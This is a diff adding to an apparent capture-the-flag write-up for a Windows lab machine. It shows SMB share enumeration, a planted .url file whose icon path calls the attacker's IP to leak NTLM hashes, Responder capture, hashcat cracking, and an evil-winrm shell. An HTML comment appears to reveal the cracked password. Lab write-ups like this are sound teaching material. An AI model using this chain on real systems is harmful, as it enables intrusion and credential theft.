@@ -1053,6 +1053,95 @@ The first try I made was with common_corporate_passwords.lst, it takes more than
           [445][smb2] host: 10.10.254.1   login: myrtleowe   password: XXXXXXX
           1 of 1 target successfully completed, 1 valid password found
 
+Since winRM is enabled I tried the credential to get a remote shell on the system, but I got the following error:
+
+          Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+
+So it seems that the user myrtleowe doesn't have the appropriate permission to access the shell. 
+Indeed with these credentials, we have access to a shared foleder Files:
+
+          smbmap -H set.windcorp.thm -u myrtleowe -p XXXXXXX
+          ...
+          [+] IP: 10.10.254.1:445 Name: set.windcorp.thm          Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        E$                                                      NO ACCESS       Default share
+        Files                                                   READ ONLY
+        IPC$                                                    READ ONLY       Remote IPC
+
+Let's connect:
+
+          smbclient '//set.windcorp.thm/Files' -U myrtleowe
+          Password for [WORKGROUP\myrtleowe]:
+          Try "help" to get a list of possible commands.
+          smb: \> ls
+            .                                   D        0  Tue Jun 16 23:08:26 2020
+            ..                                  D        0  Tue Jun 16 23:08:26 2020
+            Info.txt                            A      123  Tue Jun 16 23:57:12 2020
+          
+                          10328063 blocks of size 4096. 6183658 blocks available
+          smb: \> get Info.txt 
+          getting file \Info.txt of size 123 as Info.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
+
+Inspecting the content of the downloaded file:
+
+          Zip and save your project files here. 
+          We will review them
+
+So we got a hint to try some attacks. We have to find a way to execute a command once the file is unzipped. The command should be to visit a UNC path to our attacker machine to get NTLM credentials. This is a common scenario that we can accomplish using Responder. The problem here is to automatically execute the command. Since I have already faced this scenario, I created a .url file as follows:
+
+          cat proj01.url                                                          
+          [InternetShortcut]
+          URL=https://google.com
+          IconIndex=0
+          IconFile=\\10.9.1.97\set.ico
+For more info about this type of attacks, have a look [here](https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes/).
+
+Note that this file is flagged as malicious on Windows 11 machine. I have not tested the payload in other recent windows system, so just keep in mind that could not work.  
+Then I zipped the file as required:
+
+          zip proj01.zip proj01.url 
+Finally upload the file (note that even if smbmap reported that we have only Read permission on the folder, indedd we have write permission too):
+
+          ...
+          smb: \> put proj01.zip 
+          putting file proj01.zip as \proj01.zip (1.1 kb/s) (average 1.1 kb/s)
+Now start Responder:
+
+          sudo responder -I tun0 -v 
+After a while you should get an hash:
+
+          [+] Listening for events...                                                                                                                                                                                               
+          [SMB] NTLMv2-SSP Client   : 10.10.254.1
+          [SMB] NTLMv2-SSP Username : SET\MichelleWat
+          [SMB] NTLMv2-SSP Hash     : MichelleWat::SET:b72bdc7ef89b006d:...000000000000000000                
+
+Now the story is always the same: trying to reverse the hashed credential:
+
+          cat mwat-set          
+          MichelleWat::SET:a8e00fd5274a1577:6825823412DA3FC8AC..00
+
+          sudo hashcat -m 5600 -a 0 mwat-set /usr/share/wordlists/rockyou.txt
+          ...
+                    MICHELLEWAT::SET:a8e00fd5274a1577...000:XXXXXXX
+                                                                    
+          Session..........: hashcat
+          Status...........: Cracked
+          Hash.Mode........: 5600 (NetNTLMv2)
+
+<!-- !!!MICKEYmouse -->
+
+Using these credentials we can access get a remote shell:
+
+          evil-winrm -i 10.10.254.1 -u MICHELLEWAT                                           
+          Enter Password: 
+          ...                              
+          Evil-WinRM shell v3.5                          
+          Info: Establishing connection to remote endpoint
+          *Evil-WinRM* PS C:\Users\MichelleWat\Documents> 
+
 
 
 
